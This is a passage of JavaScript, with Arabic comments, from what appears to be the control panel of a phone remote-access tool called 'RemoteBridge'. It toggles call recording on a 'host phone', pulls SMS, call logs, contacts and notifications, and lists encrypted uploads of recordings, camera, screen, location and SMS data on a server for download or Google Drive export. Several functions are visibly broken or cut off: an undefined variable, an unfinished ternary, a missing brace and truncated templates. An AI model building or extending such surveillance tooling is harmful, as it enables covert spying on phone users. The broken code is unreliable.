            const host = document.getElementById('host-perms-status');
            if (host) host.innerHTML = renderHostPermsStatus();
        }

        function renderHostPermsStatus() {
            return Object.entries(hostPermHints).map(([key, p]) => {
                const cls = p.ok === true
                    ? 'bg-emerald-950/60 border-emerald-500/30 text-emerald-300'
                    : p.ok === false
                        ? 'bg-rose-950/40 border-rose-500/30 text-rose-300'
                        : 'bg-slate-950/60 border-slate-700/60 text-slate-400';
                const txt = p.ok === true ? '✅' : p.ok === false ? '⚠️' : '❓';
                return `<span class="${cls} px-2 py-1 rounded-lg">${txt} ${p.label}</span>`;
            }).join('');
        }

        // — تسجيل المكالمات على المضيف + دفعة الخزنة المشفرة —
        function setCallRecording(enabled) {
            sendRPCCommand('call_record_set', { enabled: !!enabled }).catch(e => showToast(String(e.message || e), 'error'));
            markHostPerm('callRecord', !!enabled);
            showToast(enabled ? 'تم إرسال طلب تفعيل تسجيل المكالمات للهاتف المضيف ☎️' : 'تم إيقاف تسجيل المكالمات على المضيف', 'info');
        }
        function flushVaultNow() {
            sendRPCCommand('vault_flush').catch(e => showToast(String(e.message || e), 'error'));
            showToast('طلب دفعة الخزنة المشفرة (رفع المعلّق إلى الخادم) أُرسل 🔐', 'info');
        }

        // — تحقق يدوي من حالة أذونات المضيف عبر بقّاطع أوامر فعلية —
        function refreshHostPermsNow() {
            showToast('جارٍ التحقق من أذونات المضيف من خلال استجابات أوامر حقيقية...', 'info');
            sendRPCCommand('notifications_list', null, { timeout: 7000 }).catch(() => markHostPerm('notifications', false));
            sendRPCCommand('calls_list', null, { timeout: 7000 }).catch(() => markHostPerm('callLog', false));
            sendRPCCommand('recordings_list', null, { timeout: 7000 }).catch(() => {});
            setTimeout(() => {
                const host = document.getElementById('host-perms-status');
                if (host) host.innerHTML = renderHostPermsStatus();
            }, 7500);
        }

        // — مستعرض ملفات الخزنة المشفرة المرفوعة إلى خادم Render (بلا تكرار عبر sha256 + حالة المشاهدة) —
        const SEEN_BLOBS_KEY = 'remotebridge_seen_blobs_v1';
        const VAULT_BLOB_KINDS = ['callrec', 'screen', 'camera', 'audio', 'screenshot', 'screenshots', 'location', 'calls', 'sms', 'notifs', 'net'];
        function getSeenBlobs() {
            try { return new Set(JSON.parse(localStorage.getItem(SEEN_BLOBS_KEY) || '[]')); }
            catch (_) { return new Set(); }
        }
        function saveSeenBlobs(set) {
            try { localStorage.setItem(SEEN_BLOBS_KEY, JSON.stringify([...set].slice(-800))); } catch (_) {}
        }
        function markBlobSeen(kind, name) {
            const s = getSeenBlobs();
            s.add(kind + '/' + name);
            saveSeenBlobs(s);
            openVaultBlobsPanel(); // إعادة رسم بعد تصفية التكرار
        }
        function markAllBlobsSeen() {
            const s = getSeenBlobs();
            (window.__vaultBlobsCache || []).forEach(b => s.add(b.kind + '/' + b.name));
            saveSeenBlobs(s);
            openVaultBlobsPanel();
        }

        async function openVaultBlobsPanel(forDeviceId) {
            const base = serverStateApiBase();
            const hostId = forDeviceId || appConfig.targetDeviceId || '';
            if (!base || !hostId) { showToast('اضبط عنوان الخادم وحدد معرف الهاتف المضيف أولاً', 'warn'); return; }
            showToast('جارٍ جلب قائمة ملفات الخزنة المشفرة من الخادم...', 'info');
            const results = await Promise.allSettled(
                VAULT_BLOB_KINDS.map(k => fetch(base + '/api/blob/list?device=' + encodeURIComponent(hostId) + '&kind=' + encodeURIComponent(k)).then(r => r.ok ? r.json() : { items: [] }))
            );
            const seen = getSeenBlobs();
            const blobs = [];
            results.forEach(r => {
                if (r.status === 'fulfilled' && Array.isArray(r.value.items)) blobs.push(...r.value.items);
            });
            blobs.forEach(b => b.__isNew = !seen.has(b.kind + '/' + b.name));
            blobs.sort((a, b) => (b.ts || 0) - (a.ts || 0));
            window.__vaultBlobsCache = blobs;
            const news = blobs.filter(b => b.__isNew).length;

            const rows = blobs.length === 0 ? `
                <div class="text-center text-slate-500 text-xs py-6">لا توجد ملفات خزنة مرفوعة بعد لهذا الجهاز على الخادم</div>
            ` : blobs.map(b => {
                const shaShort = String(b.sha256 || '').slice(0, 10);
                return `
                <div class="flex items-center gap-2 px-2.5 py-2 rounded-xl border ${b.__isNew ? 'border-amber-500/50 bg-amber-950/20' : 'border-slate-800 bg-slate-950/40'}">
                    <span class="text-[9px] font-bold px-1.5 py-0.5 rounded-md bg-slate-800 text-slate-300 shrink-0">${b.kind}</span>
                    <div class="min-w-0 flex-1">
                        <p class="text-[11px] font-bold text-slate-200 truncate" style="direction:ltr">${escHtml(String(b.name || ''))}</p>
                        <p class="text-[9px] mt-0.5"><span class="ts-en">${fmtEnTime(b.ts || 0)}</span> • ${recFmtSize(b.size || 0)} • sha:<span class="ts-en">${shaShort}</span></p>
                    </div>
                    ${b.__isNew ? '<span class="text-[9px] font-bold text-amber-300 shrink-0">🆕 جديدة</span>' : '<span class="text-[9px] font-bold text-slate-500 shrink-0">✓ منزولة</span>'}
                    <button onclick='markBlobSeen(${JSON.stringify(b.kind)}, ${JSON.stringify(String(b.name || ""))})' class="text-[9px] font-bold bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-1 rounded-lg shrink-0" title="تحديد كمشاهدة (استبعاد التكرار عند الجلب)">👁️</button>
                    <button onclick='mpFromVault(${JSON.stringify(b.kind)}, ${JSON.stringify(String(b.name || ""))})' class="text-[9px] font-bold bg-emerald-800/70 hover:bg-emerald-700 text-emerald-200 px-1.5 py-1 rounded-lg shrink-0" title="تشغيل عبر المشغل الاحترافي (مفكوك التشفير عبر الربط الحي)">▶️</button>
                    <button onclick='driveUploadVaultBlob(${JSON.stringify(b.kind)}, ${JSON.stringify(String(b.name || ""))}, false)' class="text-[9px] font-bold bg-sky-800/70 hover:bg-sky-700 text-sky-200 px-1.5 py-1 rounded-lg shrink-0" title="رفع نسخة مفكوكة التشفير إلى Google Drive">▲ Drive</button>
                    <a href="${base}/api/blob?device=${encodeURIComponent(hostId)}&kind=${encodeURIComponent(b.kind)}&name=${encodeURIComponent(b.name || '')}" download class="text-[9px] font-bold bg-emerald-900/70 hover:bg-emerald-800 text-emerald-300 px-1.5 py-1 rounded-lg shrink-0">⬇️</a>
                </div>
                `;
            }).join('');

            mountWindowOverlay(`
                <div class="chat-header">
                    <div>
                        <h4 class="font-bold text-slate-100 text-sm">📦 خزنة المضيف المشفرة — مزامنة خادم Render</h4>
                        <p class="text-[10px] text-slate-400 mt-0.5">${blobs.length} ملف مشفر (AES-256/GCM) • <span class="text-amber-300 font-bold">${news} جديدة</span> • استبعاد التكرار عبر sha256 تلقائياً</p>
                    </div>
                    <div class="flex items-center gap-1.5">
                        <button onclick="rbVaultBulkUploadAll()" class="text-[10px] font-bold bg-sky-800/80 hover:bg-sky-700 text-sky-100 border border-sky-600/50 px-2 py-1 rounded-lg">▲ رفع الجديد إلى Drive</button>
                        <button onclick="markAllBlobsSeen()" class="text-[10px] font-bold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 px-2 py-1 rounded-lg">✓ اجعل الكل منزولاً</button>
                        <button onclick="closeWindowOverlay()" class="text-slate-400 hover:text-white px-1.5 py-1 text-sm">✕</button>
                    </div>
                </div>
                <div class="chat-body space-y-2">${rows}</div>
            `);
        }

        // Tab Switching
        function switchTab(tab) {
            activeTab = tab;

            // Desktop tab highlights
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('bg-emerald-600/20', 'text-emerald-400', 'font-bold', 'active-tab', 'md:shadow-lg');
                btn.classList.add('text-slate-300');
            });

            // Mobile tab highlights
            document.querySelectorAll('.tab-btn-mobile').forEach(btn => {
                btn.classList.remove('bg-emerald-600/20', 'text-emerald-400', 'border', 'border-emerald-500/30', 'font-bold', 'active-tab');
                btn.classList.add('bg-slate-800/60', 'text-slate-300', 'font-medium');
            });

            // B4 — تأثير مرئي مركزي للتبويب النشط (توهج نابض) على الحاسوب والهاتف معاً
            document.querySelectorAll('.tab-btn, .tab-btn-mobile').forEach(btn => {
                const m = (btn.getAttribute('onclick') || '').match(/switchTab\(['"]([\w-]+)['"]\)/);
                if (m && m[1] === tab) { btn.classList.add('active-tab'); btn.classList.remove('bg-slate-800/60', 'text-slate-300', 'font-medium'); }
            });

            const panel = document.getElementById("panel-content");
            // أي دخول لتبويب قائمة = تسجيل المعاينة وإصفار شارته
            if (['files', 'contacts', 'sms', 'calls', 'notifications', 'studio'].includes(tab)) {
                setTimeout(() => markTabSeen(tab), 0);
            }
            if (tab === 'dashboard') {
                panel.innerHTML = renderDashboardView();
                setTimeout(() => updateWebRTCDiagnosticUI(), 50);
                sendRPCCommand('device_info');
            } else if (tab === 'files') {
                renderFilesExplorerView();
                sendRPCCommand('storage_explore', { path: currentExplorerPath });
            } else if (tab === 'camera') {
                renderCameraStreamView();
            } else if (tab === 'contacts') {
                renderContactsListView();
                sendRPCCommand('contacts_list');
            } else if (tab === 'sms') {
                renderSmsListView();
                sendRPCCommand('sms_list');
                if (contactsData.length === 0) sendRPCCommand('contacts_list', null, { timeout: 6000, retries: 0 }).catch(() => {});
            } else if (tab === 'calls') {
                renderCallsListView();
                sendRPCCommand('calls_list');
                if (contactsData.length === 0) sendRPCCommand('contacts_list', null, { timeout: 6000, retries: 0 }).catch(() => {});
            } else if (tab === 'notifications') {
                renderNotificationsListView();
                sendRPCCommand('notifications_list');
            } else if (tab === 'studio') {
                renderStudioView();
            } else if (tab === 'settings') {
                panel.innerHTML = renderSettingsView();
            }
        }

        // ==========================================================
        //   🎬 الاستوديو — الصور/الفيديو/الصوت مصغّرة، الأحدث أولاً، بنقرة جلب
        //   المصدر: أوامر media_folders (قائمة المجلدات الحاوية وسائط)
        //   و media_items (عناصر المجلدات المختارة مع مصغرات).
        // ==========================================================
        const STUDIO_FOLDER_KEY = "remotebridge_studio_folders_v1";
        let studioItems = [];
        let studioFilter = "all";
        // B5 — حجم عرض شبكة الاستوديو: s صغير / m متوسط / l كبير / details تفاصيل (محفوظ)
        let studioViewSize = (function () { try { return localStorage.getItem('rb_studio_view_v1') || 'm'; } catch (_) { return 'm'; } })();
        let studioLoading = false;
        let studioFolders = [];
        let studioPendingSel = null;
        try {
            studioFolders = (JSON.parse(localStorage.getItem(STUDIO_FOLDER_KEY) || "[]") || [])
                .filter(f => f && (f.path || f.label));
        } catch (_) { studioFolders = []; }

        function saveStudioFolders() {
            try { localStorage.setItem(STUDIO_FOLDER_KEY, JSON.stringify(studioFolders)); } catch (_) {}
        }

        function setStudioBadge(n) {
            const dEl = document.getElementById("badge-studio");
            const mEl = document.getElementById("badge-studio-m");

            if (dEl) { dEl.hidden = !show; if (show) dEl.textContent = n; }
            if (mEl) { mEl.hidden = !show; if (show) mEl.textContent = n; }
        }

        function renderStudioView() {
            const panel = document.getElementById("panel-content");
            panel.innerHTML = `
                <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center pb-3 mb-3 border-b border-slate-800 gap-2">
                    <div>
                        <h2 class="text-lg md:text-xl font-bold text-emerald-300">🎬 الاستوديو — الوسائط الحديثة</h2>
                        <p class="text-xs text-slate-400 mt-0.5">عرض مصغّر للصور والفيديو والصوت من المجلدات المختارة — الأحدث أولاً — لا يُجلب تلقائياً إلا بنقرة «جلب»</p>
                    </div>
                    <div class="flex flex-wrap items-center gap-2">
                        <span class="studio-chip ${studioFilter === 'all' ? 'active' : ''}" onclick="applyStudioFilter('all')">الكل</span>
                        <span class="studio-chip ${studioFilter === 'image' ? 'active' : ''}" onclick="applyStudioFilter('image')">🖼 صور</span>
                        <span class="studio-chip ${studioFilter === 'video' ? 'active' : ''}" onclick="applyStudioFilter('video')">🎞 فيديو</span>
                        <span class="studio-chip ${studioFilter === 'audio' ? 'active' : ''}" onclick="applyStudioFilter('audio')">🎵 صوت</span>
                        <button onclick="openStudioFolderPicker()" class="bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs px-3 py-1.5 rounded-xl font-bold border border-slate-700">📂 اختيار المجلدات</button>
                        <button onclick="fetchStudioMedia()" class="bg-emerald-600 hover:bg-emerald-500 text-white text-xs px-3 py-1.5 rounded-xl font-bold shadow-md">🔄 جلب الوسائط</button>
                        <span class="w-px h-6 bg-slate-700 mx-0.5"></span>
                        <button onclick="openMediaFolderBrowser()" title="تصفح شجرة مجلدات الهاتف والتنقل بين المجلدات الفرعية" class="bg-sky-800/80 hover:bg-sky-700 text-sky-100 text-xs px-3 py-1.5 rounded-xl font-bold border border-sky-600">🗂 تصفح المجلدات</button>
                    </div>
                </div>
                <div id="studio-buckets-line" class="text-[10px] text-slate-500 mb-2 flex flex-wrap items-center gap-1.5 justify-between">
                    <span id="studio-buckets-text">لم تُختر مجلدات بعد — انقر «اختيار المجلدات» لتحديد ما يُعرض في الاستوديو.</span>
                    <span class="flex items-center gap-1">
                        <span class="text-slate-500">حجم العرض:</span>
                        <button class="viewsize-btn ${studioViewSize === 's' ? 'vs-active' : ''}" onclick="applyStudioViewSize('s')" title="صور مصغرة صغيرة">S</button>
                        <button class="viewsize-btn ${studioViewSize === 'm' ? 'vs-active' : ''}" onclick="applyStudioViewSize('m')" title="حجم متوسط">M</button>
                        <button class="viewsize-btn ${studioViewSize === 'l' ? 'vs-active' : ''}" onclick="applyStudioViewSize('l')" title="حجم كبير">L</button>
                        <button class="viewsize-btn ${studioViewSize === 'details' ? 'vs-active' : ''}" onclick="applyStudioViewSize('details')" title="عرض التفاصيل نصياً">☰ تفاصيل</button>
                    </span>
                </div>
                <div id="studio-grid" class="grid ${studioViewSize === 's' ? 'vs-s' : studioViewSize === 'l' ? 'vs-l' : studioViewSize === 'details' ? 'vs-details' : ''}"></div>
                <div id="studio-folder-modal-host"></div>
            `;
            renderStudioGrid();
        }

        function updateStudioBucketsLine() {
            const el = document.getElementById("studio-buckets-line");
            if (!el) return;
            const txt = document.getElementById("studio-buckets-text");
            // B5 — يُحدَّث نص المجلدات فقط مع صيانة أزرار حجم العرض في نفس السطر
            if (txt) {
                txt.textContent = studioFolders.length

            }
        }

        function applyStudioViewSize(mode) {
            studioViewSize = mode;
            try { localStorage.setItem('rb_studio_view_v1', mode); } catch (_) {}

        function applyStudioFilter(kind) {
            studioFilter = kind;
            renderStudioView();
        }

        function renderStudioGrid() {
            const grid = document.getElementById("studio-grid");
            if (!grid) return;
            updateStudioBucketsLine();
            if (studioLoading) {
                grid.innerHTML = Array.from({ length: 12 }).map(() =>

                grid.innerHTML = `<div class="col-span-full text-center py-10 text-slate-500 text-xs bg-slate-900/40 rounded-xl border border-slate-800">
